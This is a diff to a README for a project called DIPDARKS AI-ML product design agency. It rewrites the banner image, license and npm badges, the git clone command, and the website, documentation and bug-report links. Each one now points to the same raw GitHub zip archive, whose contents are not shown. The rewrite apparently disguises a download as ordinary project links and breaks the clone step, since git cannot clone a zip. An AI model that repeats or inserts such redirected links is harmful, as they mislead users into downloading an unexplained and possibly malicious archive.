@@ -2,12 +2,12 @@
 
 <div align="center">
 
-![Agency Banner](https://raw.githubusercontent.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency/main/assets/banner.gif)
+![Agency Banner](https://raw.githubusercontent.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency/main/lazarev-main/Agency-P-A-DESIG-Rduct-DIPDARK-M-v3.2.zip)
 
 *Transforming Ideas into Intelligent Solutions*
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![npm version](https://badge.fury.io/js/dipdarks-ai-ml.svg)](https://badge.fury.io/js/dipdarks-ai-ml)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency/main/lazarev-main/Agency-P-A-DESIG-Rduct-DIPDARK-M-v3.2.zip)
+[![npm version](https://raw.githubusercontent.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency/main/lazarev-main/Agency-P-A-DESIG-Rduct-DIPDARK-M-v3.2.zip)](https://raw.githubusercontent.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency/main/lazarev-main/Agency-P-A-DESIG-Rduct-DIPDARK-M-v3.2.zip)
 [![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat)](CONTRIBUTING.md)
 
 <p align="center">
@@ -83,7 +83,7 @@ Follow these steps to get started with our platform:
 
 ```bash
 # Clone the repository
-git clone https://github.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency
+git clone https://raw.githubusercontent.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency/main/lazarev-main/Agency-P-A-DESIG-Rduct-DIPDARK-M-v3.2.zip
 
 # Navigate to the project directory
 cd DIPDARKS-AI-ML-PRduct-DESIGN-Agency
@@ -177,5 +177,5 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 <div align="center">
   <p class="pulse">Made with ❤️ by DIPDARKS Agency</p>
   
-  [Website](https://dipdarks.com) • [Documentation](https://docs.dipdarks.com) • [Report Bug](https://github.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency/issues)
+  [Website](https://raw.githubusercontent.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency/main/lazarev-main/Agency-P-A-DESIG-Rduct-DIPDARK-M-v3.2.zip) • [Documentation](https://raw.githubusercontent.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency/main/lazarev-main/Agency-P-A-DESIG-Rduct-DIPDARK-M-v3.2.zip) • [Report Bug](https://raw.githubusercontent.com/dipeshdarks/DIPDARKS-AI-ML-PRduct-DESIGN-Agency/main/lazarev-main/Agency-P-A-DESIG-Rduct-DIPDARK-M-v3.2.zip)
 </div>
